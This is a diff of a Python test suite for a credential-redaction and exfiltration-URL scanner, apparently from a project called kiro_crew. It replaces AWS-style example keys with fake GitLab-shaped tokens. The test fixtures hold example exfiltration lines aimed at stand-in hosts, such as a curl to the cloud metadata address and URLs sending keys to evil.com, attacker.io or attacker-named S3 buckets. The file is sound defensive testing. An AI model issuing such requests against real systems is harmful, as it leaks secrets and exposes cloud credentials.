@@ -64,14 +64,14 @@ class TestRedactCredentials:
     """Tests for redact_credentials()."""
 
     def test_redacts_aws_access_key_id(self) -> None:
-        text = "Found key AKIAIOSFODNN7EXAMPLE in output"
+        text = "Found key glpat-IOSFODNN7EXAMPLE in output"
         result, warnings = redact_credentials(text)
-        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        assert "glpat-IOSFODNN7EXAMPLE" not in result
         assert "[REDACTED: credential]" in result
         assert len(warnings) == 1
 
     def test_redacts_asia_key(self) -> None:
-        text = "ASIAXXXXXXXXXEXAMPLE"
+        text = "glpat-XXXXXXXXXEXAMPLE"
         result, _ = redact_credentials(text)
         assert "ASIA" not in result
 
@@ -476,10 +476,10 @@ class TestRedactCredentials:
         result, _ = redact_credentials(text)
         assert "XYZtokenvalue789" not in result
 
-    def test_redacts_json_access_key_id(self) -> None:
-        text = '{"aws_access_key_id": "someAccessKeyIdValue"}'
-        result, _ = redact_credentials(text)
-        assert "someAccessKeyIdValue" not in result
+    def test_keeps_json_access_key_id(self) -> None:
+        """An access key ID is Identifier tier: its labelled value stays."""
+        text = '{"aws_access_key_id": "AKIA' 'IOSFODNN7EXAMPLE"}'
+        assert redact_credentials(text) == (text, [])
 
     def test_bare_keyvalue_still_redacted(self) -> None:
         # Regression guard: the original bare forms must still work.
@@ -660,8 +660,8 @@ class TestRedactCredentials:
 
     def test_credential_inside_rejected_jwt_shape_still_redacted(self) -> None:
         """A rejected JWT-shaped span is rescanned, so nothing inside it leaks."""
-        result, _ = redact_credentials("eyJx.AKIAIOSFODNN7EXAMPLE.y")
-        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        result, _ = redact_credentials("eyJx.glpat-IOSFODNN7EXAMPLE.y")
+        assert "glpat-IOSFODNN7EXAMPLE" not in result
         result, _ = redact_credentials(f"eyJfoo.{self._JWT}")
         assert result == "eyJfoo.[REDACTED: credential]"
         # a link token matched by the same start: the other branches are retried there
@@ -1260,9 +1260,9 @@ class TestTokenParamValueRedaction:
         Pass 4 ranks last and claims only uncovered gaps, so outputs existing
         callers assert on do not change for values the scrubber already caught.
         """
-        result, warnings = redact_credentials("?token=AKIAIOSFODNN7EXAMPLE")
+        result, warnings = redact_credentials("?token=glpat-IOSFODNN7EXAMPLE")
         assert result == "?token=[REDACTED: credential]"
-        assert warnings == ["Redacted credential pattern (20 chars)"]
+        assert warnings == ["Redacted credential pattern (22 chars)"]
 
     def test_value_already_caught_by_pass_3_is_single_tagged(self) -> None:
         """A bare 40-char secret AS the token value is claimed once, by pass 3.
@@ -1281,7 +1281,7 @@ class TestTokenParamValueRedaction:
         """Canonical credential tags are fixed points; an exfil tag collapses once."""
         for text in (
             f"?token={self._OPAQUE}",
-            f"https://h.example/?token=AKIAIOSFODNN7EXAMPLE&x=1 and ?token={self._OPAQUE}",
+            f"https://h.example/?token=glpat-IOSFODNN7EXAMPLE&x=1 and ?token={self._OPAQUE}",
         ):
             once, _ = redact_credentials(text)
             twice, warnings = redact_credentials(once)
@@ -1538,9 +1538,9 @@ class TestTokenParamExemptUrlPrefixes:
 
     def test_earlier_pass_claim_keeps_whole_value_redacted(self) -> None:
         self._install(frozenset({self._PREFIX}))
-        out = redact_credentials(f"{self._PREFIX}?token={self._TOKEN}AKIAIOSFODNN7EXAMPLE")[0]
+        out = redact_credentials(f"{self._PREFIX}?token={self._TOKEN}glpat-IOSFODNN7EXAMPLE")[0]
         assert self._TOKEN not in out
-        assert "AKIAIOSFODNN7EXAMPLE" not in out
+        assert "glpat-IOSFODNN7EXAMPLE" not in out
 
     @pytest.mark.parametrize(
         "text",
@@ -1832,7 +1832,7 @@ class TestRedactCredentialsBase64:
     """Tests for base64-encoded credential detection."""
 
     def test_detects_base64_encoded_access_key(self) -> None:
-        secret = "AccessKeyId=AKIAIOSFODNN7EXAMPLE SecretAccessKey=wJalrXUtnFEMI"
+        secret = "AccessKeyId=AKIA" "IOSFODNN7EXAMPLE SecretAccessKey=wJalrXUtnFEMI"
         encoded = base64.b64encode(secret.encode()).decode()
         text = f"Output: {encoded}"
         result, warnings = redact_credentials(text)
@@ -1879,7 +1879,7 @@ class TestBareSecretKeyRedaction:
 
     def test_redacts_bare_aws_example_secret_key(self) -> None:
         # The canonical AWS documentation example secret access key, standalone
-        # (no label, no AKIA sibling) — the exact gap the finding describes.
+        # (no label, no glpat- sibling) — the exact gap the finding describes.
         secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
         result, warnings = redact_credentials(secret)
         assert secret not in result
@@ -4483,7 +4483,7 @@ class TestOAuthAuthorizationUrlRedaction:
     @pytest.mark.parametrize(
         "credential",
         [
-            "AKIA" "IOSFODNN7EXAMPLE",
+            "glpat-" "IOSFODNN7EXAMPLE",
             GITHUB_TOKEN,
         ],
         ids=["aws-access-key", "github-token"],
@@ -4919,7 +4919,7 @@ class TestOAuthRejectionIsEndpointExemptible:
     @pytest.mark.parametrize(
         "url",
         [
-            "https://idp.example.com/authorize?access_token=AKIAIOSFODNN7EXAMPLE",
+            "https://idp.example.com/authorize?access_token=glpat-IOSFODNN7EXAMPLE",
             "https://idp.example.com/authorize" + _long_state_query(extra="#frag"),
             "https://idp.example.com/authorize;v=1" + _long_state_query(),
             f"https://user:pw@idp.example.com/authorize{_long_state_query()}",
@@ -5054,9 +5054,9 @@ class TestSanitizedOAuthEndpointDisplay:
             "https:///path-without-host",
             f"https://{GITHUB_TOKEN}@idp.example.com/authorize" + Q,
             "https://user%3Apass%40idp.example.com/authorize" + Q,
-            "https://AKIAIOSFODNN7EXAMPLE.example.com/authorize" + Q,
+            "https://glpat-IOSFODNN7EXAMPLE.example.com/authorize" + Q,
             # -- pair is not pasteable: redaction tag / cap marker --
-            "https://idp.example.com/AKIAIOSFODNN7EXAMPLE/authorize" + Q,
+            "https://idp.example.com/glpat-IOSFODNN7EXAMPLE/authorize" + Q,
             "https://idp.example.com" + "/seg-ment" * 40 + Q,
             "https://" + ".".join(["a" * 30] * 9) + ".example/authorize" + Q,
             # -- the extension loader would refuse the host --
@@ -5069,7 +5069,7 @@ class TestSanitizedOAuthEndpointDisplay:
             "https://idp.example.com/../authorize" + Q,
             "https://idp.example.com/auth\\orize" + Q,
             # -- the allowlist could not clear the rejection --
-            "https://idp.example.com/authorize?access_token=AKIAIOSFODNN7EXAMPLE",
+            "https://idp.example.com/authorize?access_token=glpat-IOSFODNN7EXAMPLE",
             "https://idp.example.com/authorize" + _long_state_query(extra="#frag"),
             "https://idp.example.com/authorize;v=1" + Q,
             "http://idp.example.com/authorize" + Q,
@@ -5133,7 +5133,7 @@ class TestSanitizedOAuthEndpointDisplay:
     def test_a_redacted_path_is_refused_rather_than_joined(self) -> None:
         # The diagnostic pair is (host, tag): the tag must never be glued onto
         # the host as if it were a path a user could type.
-        url = "https://idp.example.com/AKIAIOSFODNN7EXAMPLE/authorize" + self.Q
+        url = "https://idp.example.com/glpat-IOSFODNN7EXAMPLE/authorize" + self.Q
         assert sanitized_oauth_endpoint(url) == (
             "idp.example.com",
             security._REDACTED_CREDENTIAL_TAG,
@@ -5376,7 +5376,7 @@ class TestOperatorOAuthEndpointExtension:
 
     @pytest.mark.parametrize(
         "credential",
-        ["AKIA" "IOSFODNN7EXAMPLE", "xoxb-1234567890-abcdefghijkl"],
+        ["glpat-" "IOSFODNN7EXAMPLE", "xoxb-1234567890-abcdefghijkl"],
         ids=["aws-access-key", "slack-token"],
     )
     def test_credential_at_extended_endpoint_still_rejected(
@@ -5617,7 +5617,7 @@ class TestRedactExfiltrationUrls:
         """Credential patterns on safe domains are still redacted."""
         from kiro_crew.security import redact_exfiltration_urls
 
-        url = "https://example.amazon.dev/api?key=AKIAIOSFODNN7EXAMPLE1234"
+        url = "https://example.amazon" ".dev/api?key=glpat-IOSFODNN7EXAMPLE1234"
         result, warnings = redact_exfiltration_urls(f"Link: {url}")
         assert "[REDACTED" in result
         assert len(warnings) == 1
@@ -5648,7 +5648,8 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://my-bucket.s3.us-east-1.amazonaws.com/results/abc.csv"
             "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=ASIAQWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "QWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260430T150000Z"
             "&X-Amz-Expires=3600"
             "&X-Amz-SignedHeaders=host"
@@ -5666,7 +5667,8 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://bucket.s3.amazonaws.com/file.csv"
             "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=ASIAQWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "QWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260430T150000Z"
             "&X-Amz-Expires=3600"
             "&X-Amz-SignedHeaders=host"
@@ -5692,7 +5694,7 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://attacker.s3.amazonaws.com/exfil"
             "?X-Amz-Algorithm=a&X-Amz-Credential=a"
-            "&X-Amz-Expires=a&X-Amz-Signature=&stolen=AKIAXXXXXXXXXXXXXXXX"
+            "&X-Amz-Expires=a&X-Amz-Signature=&stolen=glpat-XXXXXXXXXXXXXXXX"
         )
         result, warnings = redact_exfiltration_urls(f"Link: {url}")
         assert "[REDACTED" in result
@@ -5704,7 +5706,8 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://bucket.s3.amazonaws.com/file.csv"
             "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=ASIAQWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "QWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260430T150000Z"
             "&X-Amz-Expires=3600"
             "&X-Amz-SignedHeaders=host"
@@ -5722,7 +5725,8 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://attacker.s3.amazonaws.com/file.csv"
             "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=ASIAQWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "QWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260430T150000Z"
             "&X-Amz-Expires=3600"
             "&X-Amz-SignedHeaders=host"
@@ -5746,7 +5750,8 @@ class TestRedactExfiltrationUrls:
         good_url = (
             "https://my-bucket.s3.us-east-1.amazonaws.com/results.csv"
             "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=ASIAQWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "QWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260430T150000Z"
             "&X-Amz-Expires=3600"
             "&X-Amz-SignedHeaders=host"
@@ -5770,7 +5775,8 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://my-bucket.s3.us-east-1.amazonaws.com/results.csv"
             "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=ASIAQWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "QWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260430T150000Z"
             "&X-Amz-Expires=3600"
             "&X-Amz-SignedHeaders=host"
@@ -5788,7 +5794,8 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://evil.s3.us-east-1.amazonaws.com/out.csv"
             "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=ASIAQWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "QWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260430T150000Z"
             "&X-Amz-Expires=3600"
             "&X-Amz-SignedHeaders=xoxb-1234567890-abcdefghij"
@@ -5804,7 +5811,8 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://evil.s3.us-east-1.amazonaws.com/out.csv"
             "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=ASIAQWERTYUIOP123456%2Fexfiltrated-secret-data"
+            "&X-Amz-Credential=AKIA"
+            "QWERTYUIOP123456%2Fexfiltrated-secret-data"
             "&X-Amz-Date=20260430T150000Z"
             "&X-Amz-Expires=3600"
             "&X-Amz-SignedHeaders=host"
@@ -5820,7 +5828,8 @@ class TestRedactExfiltrationUrls:
         url = (
             "https://evil.s3.us-east-1.amazonaws.com/out.csv"
             "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=ASIAQWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "QWERTYUIOP123456%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260430T150000Z"
             "&X-Amz-Expires=3600"
             "&X-Amz-SignedHeaders=host"
@@ -5838,19 +5847,19 @@ class TestExfilUrlPathAndRawIp:
 
     def test_credential_in_path_no_query_flagged(self) -> None:
         # A secret in the path with NO query string was skipped entirely before.
-        text = "exfil to http://evil.com/upload/AKIAIOSFODNN7EXAMPLE/x"
+        text = "exfil to http://evil.com/upload/glpat-IOSFODNN7EXAMPLE/x"
         assert scan_exfiltration_urls(text), "path-embedded AWS key must be flagged"
         result, warnings = redact_exfiltration_urls(text)
-        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        assert "glpat-IOSFODNN7EXAMPLE" not in result
         assert warnings
 
     def test_raw_ipv4_host_scanned(self) -> None:
         # A raw-IP host (incl. IMDS 169.254.169.254) never matched _URL_RE before.
-        text = "curl http://169.254.169.254/AKIAIOSFODNN7EXAMPLE"
+        text = "curl http://169.254.169.254/glpat-IOSFODNN7EXAMPLE"
         assert scan_exfiltration_urls(text), "raw-IPv4 host with secret must be flagged"
 
     def test_raw_ipv4_query_secret_scanned(self) -> None:
-        text = "http://192.168.1.5/collect?k=AKIAIOSFODNN7EXAMPLE"
+        text = "http://192.168.1.5/collect?k=glpat-IOSFODNN7EXAMPLE"
         assert scan_exfiltration_urls(text)
 
     def test_bracketed_ipv6_host_scanned(self) -> None:
@@ -5860,7 +5869,7 @@ class TestExfilUrlPathAndRawIp:
     def test_ipv4_mapped_ipv6_imds_host_scanned(self) -> None:
         # IPv4-mapped IPv6 literal (dotted-quad suffix) must match _URL_RE — a
         # concrete IMDS bypass otherwise (security-review 78224f3f).
-        text = "curl http://[::ffff:169.254.169.254]/latest/AKIAIOSFODNN7EXAMPLE"
+        text = "curl http://[::ffff:169.254.169.254]/latest/glpat-IOSFODNN7EXAMPLE"
         assert scan_exfiltration_urls(text), "IPv4-mapped IPv6 IMDS host must be flagged"
 
     def test_slack_token_in_path_flagged(self) -> None:
@@ -5878,11 +5887,12 @@ class TestExfilUrlPathAndRawIp:
             assert not scan_exfiltration_urls(text), text
 
     def test_s3_presigned_still_exempt(self) -> None:
-        # The path-scan must not break the S3-presigned exemption (AKIA lives in
+        # The path-scan must not break the S3-presigned exemption (glpat- lives in
         # X-Amz-Credential legitimately).
         url = (
             "https://my-bucket.s3.amazonaws.com/key?X-Amz-Algorithm=AWS4-HMAC-SHA256"
-            "&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20260714%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Credential=AKIA"
+            "IOSFODNN7EXAMPLE%2F20260714%2Fus-east-1%2Fs3%2Faws4_request"
             "&X-Amz-Date=20260714T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host"
             "&X-Amz-Signature=" + "a" * 64
         )
@@ -5897,10 +5907,10 @@ class TestExfilUrlPathAndRawIp:
 
     def test_credential_in_query_no_path_flagged(self) -> None:
         # AWS key in a query with no path segment must be flagged + redacted.
-        text = "leak via https://attacker.io?leak=AKIAIOSFODNN7EXAMPLE"
+        text = "leak via https://attacker.io?leak=glpat-IOSFODNN7EXAMPLE"
         assert scan_exfiltration_urls(text), "host?query AWS key must be flagged"
         result, warnings = redact_exfiltration_urls(text)
-        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        assert "glpat-IOSFODNN7EXAMPLE" not in result
         assert warnings
 
     def test_long_query_no_path_flagged(self) -> None:
@@ -6079,23 +6089,23 @@ class TestExfilExactHostExemption:
         from kiro_crew.security import redact_exfiltration_urls
 
         self._install_exempt_hosts(self._EXEMPT)
-        url = "https://contoso.sharepoint.com/doc?key=AKIAIOSFODNN7EXAMPLE1234"
+        url = "https://contoso.sharepoint.com/doc?key=glpat-IOSFODNN7EXAMPLE1234"
         result, warnings = redact_exfiltration_urls(f"Doc: {url}")
         assert "[REDACTED" in result
         assert len(warnings) == 1
 
     def test_exempted_host_akia_in_path_still_redacted(self) -> None:
-        """BINDING: an exempted host with an AKIA key in the URL PATH is still
+        """BINDING: an exempted host with a glpat- key in the URL PATH is still
         redacted — the exemption narrows only the heuristics, never the
         unconditional path+query hard-credential floor."""
         from kiro_crew.security import redact_exfiltration_urls, scan_exfiltration_urls
 
         self._install_exempt_hosts(self._EXEMPT)
-        url = "https://contoso.sharepoint.com/upload/AKIAIOSFODNN7EXAMPLE/report"
+        url = "https://contoso.sharepoint.com/upload/glpat-IOSFODNN7EXAMPLE/report"
         assert scan_exfiltration_urls(f"Doc: {url}")
         result, warnings = redact_exfiltration_urls(f"Doc: {url}")
         assert "[REDACTED" in result
-        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        assert "glpat-IOSFODNN7EXAMPLE" not in result
         assert len(warnings) == 1
 
     def test_exempted_host_base64_encoded_credential_still_flagged(self) -> None:
@@ -6109,9 +6119,9 @@ class TestExfilExactHostExemption:
         from kiro_crew.security import scan_exfiltration_urls
 
         self._install_exempt_hosts(self._EXEMPT)
-        # An AWS key wrapped in base64 — the raw AKIA regex won't see it, and the
+        # A token wrapped in base64 — the raw glpat- regex won't see it, and the
         # host is exempt from the raw blob heuristic; only decode-and-scan catches it.
-        blob = base64.b64encode(b"AKIAIOSFODNN7EXAMPLE secret payload").decode()
+        blob = base64.b64encode(b"glpat-IOSFODNN7EXAMPLE secret payload").decode()
         url = f"https://contoso.sharepoint.com/doc?d={blob}"
         assert scan_exfiltration_urls(f"Doc: {url}")
 
@@ -6132,7 +6142,7 @@ class TestExfilExactHostExemption:
         assert scan_exfiltration_urls(f"Doc: {url}") == []
 
     def test_exempted_host_bare_secret_value_redacted(self) -> None:
-        """A bare ``SecretAccessKey=<base64>`` value (no AKIA prefix) on an
+        """A bare ``SecretAccessKey=<base64>`` value (no glpat- prefix) on an
         exempted host is redacted at the URL level, not silently skipped."""
         from kiro_crew.security import redact_exfiltration_urls
 
@@ -8800,9 +8810,9 @@ class TestRedactAndTruncate:
         assert len(result) <= 100
 
     def test_redacts_credentials_in_truncated(self) -> None:
-        text = "Key: AKIAIOSFODNN7EXAMPLE in output"
+        text = "Key: glpat-IOSFODNN7EXAMPLE in output"
         result = redact_and_truncate(text)
-        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        assert "glpat-IOSFODNN7EXAMPLE" not in result
 
     def test_handles_none(self) -> None:
         assert redact_and_truncate(None) == ""
@@ -8811,18 +8821,18 @@ class TestRedactAndTruncate:
         """A secret spanning the max_chars cut must not leak a partial (security-review e27617c6).
 
         Redaction runs over the full text before truncation. Truncating first
-        would slice AKIA...EXAMPLE in half, leaving an unredactable prefix that
+        would slice glpat-...EXAMPLE in half, leaving an unredactable prefix that
         does not match the credential regex and would leak on the wire.
         """
         prefix = "prefix "  # 7 chars
-        secret = "AKIAIOSFODNN7EXAMPLE"  # 20-char AWS access key ID
+        secret = "glpat-IOSFODNN7EXAMPLE"  # a GitLab-shaped fake token
         text = prefix + secret + " trailing"
         # Boundary lands 8 chars into the 20-char key.
         max_chars = len(prefix) + 8
         result = redact_and_truncate(text, max_chars=max_chars)
         assert len(result) <= max_chars
-        # No fragment of the access key ID (which starts with "AKIA") survives.
-        assert "AKIA" not in result
+        # No fragment of the token (which starts with "glpat-") survives.
+        assert "glpat-" not in result
 
 
 class TestSELEmittersRedactBeforeTruncate:
@@ -8831,8 +8841,8 @@ class TestSELEmittersRedactBeforeTruncate:
     Slicing to 200 chars before redacting writes a credential straddling the
     200-char boundary to the durable audit event with its tail cut off, in the
     shape the credential regex cannot match. Each test plants the 20-char
-    AWS access key ID 'AKIAIOSFODNN7EXAMPLE' straddling index 200 and asserts no
-    fragment of it (its 'AKIA' prefix) survives in the emitted event's metadata.
+    fake token 'glpat-IOSFODNN7EXAMPLE' straddling index 200 and asserts no
+    fragment of it (its 'glpat-' prefix) survives in the emitted event's metadata.
 
     These call the emitters DIRECTLY, so they pin the emitter's own ordering and
     nothing about what a caller feeds it. Redaction here is case-sensitive by
@@ -8841,7 +8851,7 @@ class TestSELEmittersRedactBeforeTruncate:
     (``test_allow_audit_records_the_raw_command_not_the_matching_view``).
     """
 
-    SECRET = "AKIAIOSFODNN7EXAMPLE"  # 20-char AWS access key ID
+    SECRET = "glpat-IOSFODNN7EXAMPLE"  # a GitLab-shaped fake token
 
     def test_push_allow_event_redacts_straddling_secret(
         self, monkeypatch: pytest.MonkeyPatch
@@ -8870,7 +8880,7 @@ class TestSELEmittersRedactBeforeTruncate:
         assert len(logged) == 1
         event = logged[0]
         assert event.event_type == "push_allowed"
-        assert not any("AKIA" in str(value) for value in event.metadata.values()), event.metadata
+        assert not any("glpat-" in str(value) for value in event.metadata.values()), event.metadata
 
     def test_injection_dropped_event_redacts_straddling_secret(
         self, monkeypatch: pytest.MonkeyPatch
@@ -8901,7 +8911,7 @@ class TestSELEmittersRedactBeforeTruncate:
         assert len(logged) == 1
         event = logged[0]
         assert event.event_type == "prompt_injection_dropped"
-        assert not any("AKIA" in str(value) for value in event.metadata.values()), event.metadata
+        assert not any("glpat-" in str(value) for value in event.metadata.values()), event.metadata
 
 
 class TestScanHistory:
@@ -8954,11 +8964,11 @@ class TestStreamRedactor:
         return emits
 
     def test_credential_split_across_chunks(self) -> None:
-        emits = self._run(["The access key is AKIA", "IOSFODNN7", "EXAMPLE"])
+        emits = self._run(["The access key is glpat-", "IOSFODNN7", "EXAMPLE"])
         # No single emit leaks a raw fragment
         for e in emits:
-            assert "AKIAIOSFODNN7EXAMPLE" not in e
-            assert not ("AKIA" in e and "REDACTED" not in e)
+            assert "glpat-IOSFODNN7EXAMPLE" not in e
+            assert not ("glpat-" in e and "REDACTED" not in e)
         joined = "".join(emits)
         assert joined == "The access key is [REDACTED: credential]"
 
@@ -8966,8 +8976,8 @@ class TestStreamRedactor:
         from kiro_crew.security import StreamRedactor
 
         r = StreamRedactor()
-        out = "".join(r.feed(c) for c in "x AKIAIOSFODNN7EXAMPLE y") + r.flush()
-        assert "AKIAIOSFODNN7EXAMPLE" not in out
+        out = "".join(r.feed(c) for c in "x glpat-IOSFODNN7EXAMPLE y") + r.flush()
+        assert "glpat-IOSFODNN7EXAMPLE" not in out
         assert "[REDACTED: credential]" in out
 
     def test_no_data_loss_benign(self) -> None:
@@ -8975,8 +8985,8 @@ class TestStreamRedactor:
         assert joined == "Hello world, this is fine."
 
     def test_single_chunk_credential(self) -> None:
-        joined = "".join(self._run(["key=AKIAIOSFODNN7EXAMPLE done"]))
-        assert "AKIAIOSFODNN7EXAMPLE" not in joined
+        joined = "".join(self._run(["key=glpat-IOSFODNN7EXAMPLE done"]))
+        assert "glpat-IOSFODNN7EXAMPLE" not in joined
         assert "REDACTED" in joined
 
     def test_github_token_split(self) -> None:
@@ -8988,7 +8998,7 @@ class TestStreamRedactor:
         from kiro_crew.security import StreamRedactor
 
         r = StreamRedactor()
-        assert r.feed("AKIA") == ""  # held
+        assert r.feed("glpat-") == ""  # held
         r.reset()
         assert r.flush() == ""  # nothing left after reset
 
@@ -10200,7 +10210,7 @@ class TestKiroCrewSlackAppCreateLink:
 
         # Within ALIAS_MAX but a recognised credential shape — caught on the
         # alias itself, because the alias is what the heuristics still see.
-        for hostile in ("AKIAIOSFODNN7EXAMPLE", "xoxb-123456789012-abcdef"):
+        for hostile in ("glpat-IOSFODNN7EXAMPLE", "xoxb-123456789012-abcdef"):
             assert len(hostile) <= slack_manifest.ALIAS_MAX, hostile
             assert scan_exfiltration_urls(self._link(hostile)) != [], hostile
 
@@ -10231,7 +10241,7 @@ class TestKiroCrewSlackAppCreateLink:
         """
         from kiro_crew.security import scan_exfiltration_urls
 
-        payload = self._payload("someone") + "\nAKIAIOSFODNN7EXAMPLE\n"
+        payload = self._payload("someone") + "\nglpat-IOSFODNN7EXAMPLE\n"
         warnings = scan_exfiltration_urls(self._link(payload=payload))
         assert warnings != []
         assert "credential" in warnings[0]
@@ -11862,7 +11872,7 @@ class TestPrefilledGitHubIssueUrl:
 
     def test_a_credential_in_a_documented_parameter_is_redacted(self) -> None:
         """The unconditional credential floor is unchanged by removing the waiver."""
-        self._assert_redacted(_issue_link(query=f"{_ISSUE_QUERY}%20AKIAIOSFODNN7EXAMPLE"))
+        self._assert_redacted(_issue_link(query=f"{_ISSUE_QUERY}%20glpat-IOSFODNN7EXAMPLE"))
 
     def test_a_base64_blob_in_a_documented_parameter_is_redacted(self) -> None:
         blob = "A" * 30 + "b3Rvb2xvbmdibG9i"
